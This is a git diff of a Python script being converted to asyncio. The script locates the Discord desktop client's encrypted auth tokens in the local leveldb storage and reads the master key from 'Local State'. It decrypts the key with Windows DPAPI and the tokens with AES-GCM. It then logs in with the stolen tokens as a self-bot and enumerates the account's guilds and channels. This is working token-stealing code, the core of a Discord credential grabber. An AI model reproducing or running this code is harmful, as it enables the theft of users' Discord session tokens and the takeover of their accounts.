@@ -23,26 +23,28 @@ async def on_ready():
     print(f'Logged in as {client.user.name} (ID: {client.user.id})')
     # # await list_channels()
     # # token_test()
-    await client.close()
+    # await client.close()
     # await list_channels()
 
 
-def verify_token_with_nickname(tokens: set, nickname: str):
+async def verify_token_with_nickname(tokens: set, nickname: str):
     for token in tokens:
         try:
-            client.run(token, bot=False)
+            await client.start(token, bot=False)
+            #await client.connect()
             print(client.user.name)
+            # if client.user.name == nickname:
             if client.user.name == '':
                 return token
             else:
-                client.close()
+                await client.logout()
                 continue
         except Exception as e:
             raise e
     return "Not found"
 
 
-@client.event
+#@client.event
 async def list_channels():
     print(client.guilds)
     for private_channel in client.guilds:
@@ -62,7 +64,7 @@ async def list_channels():
                 #     print(await message.delete())
 
 
-def get_secret_key():
+async def get_secret_key():
     try:
         with open(os.getenv('APPDATA') + '\\discord' + '\\Local State', 'r') as file:
             key = loads(file.read())['os_crypt']['encrypted_key']
@@ -72,7 +74,7 @@ def get_secret_key():
         raise e
 
 
-def find_auth_tokens_encrypted():
+async def find_auth_tokens_encrypted():
     tokens = set()
     path = os.getenv('APPDATA') + '\\discord' + '\\Local Storage' + '\\leveldb'
     try:
@@ -87,8 +89,8 @@ def find_auth_tokens_encrypted():
         raise e
 
 
-def decrypt_token(auth_token_encrypted: bytes | bytearray | memoryview,
-                  secret_key_encrypted: bytes | bytearray | memoryview):
+async def decrypt_token(auth_token_encrypted: bytes | bytearray | memoryview,
+                        secret_key_encrypted: bytes | bytearray | memoryview):
     try:
         secret_key_decrypted = CryptUnprotectData(secret_key_encrypted, None, None, None, 0)[1]
         auth_token_decrypted = AES.new(key=secret_key_decrypted, mode=AES.MODE_GCM,
@@ -99,33 +101,37 @@ def decrypt_token(auth_token_encrypted: bytes | bytearray | memoryview,
         raise e
 
 
-def token_test():
-    tokens = find_auth_tokens_encrypted()
+async def token_test():
+    tokens = await find_auth_tokens_encrypted()
     print(tokens)
-    secret_key = get_secret_key()
+    secret_key = await get_secret_key()
     print(secret_key)
     final_tokens = set()
     for encrypted_token in tokens:
         final_tokens.add(
-            decrypt_token(b64decode(encrypted_token.split('dQw4w9WgXcQ:')[1]), b64decode(secret_key)[5:]))
+            await decrypt_token(b64decode(encrypted_token.split('dQw4w9WgXcQ:')[1]), b64decode(secret_key)[5:]))
     print(final_tokens)
     return final_tokens
     # global gl_token
     # gl_token = final_tokens
 
 
-def abbbbb():
-    valid_tokens = token_test()
-    verify_token_with_nickname(valid_tokens, global_nickname)
+async def abbbbb():
+    valid_tokens = await token_test()
+    await verify_token_with_nickname(valid_tokens, global_nickname)
     # await client.start(gl_token, bot=False, reconnect=False)
     # client.login(gl_token, bot=False)
     # client.connect(reconnect=False)
 
 
-def main():
+async def main():
     # await client.login(token=gl_token,bot=False)
     # await client.connect()
-    abbbbb()
+    # await abbbbb()
+    tasks = [
+        asyncio.create_task(abbbbb())
+    ]
+    await asyncio.wait(tasks)
 
     # await client.start(gl_token, bot=False, reconnect=False)
     # loop = asyncio.get_event_loop()
@@ -168,7 +174,7 @@ def main():
 
 if __name__ == '__main__':
     # main()
-    main()
+    asyncio.run(main())
 
     # tasks = asyncio.gather(
     #     abbbbb()
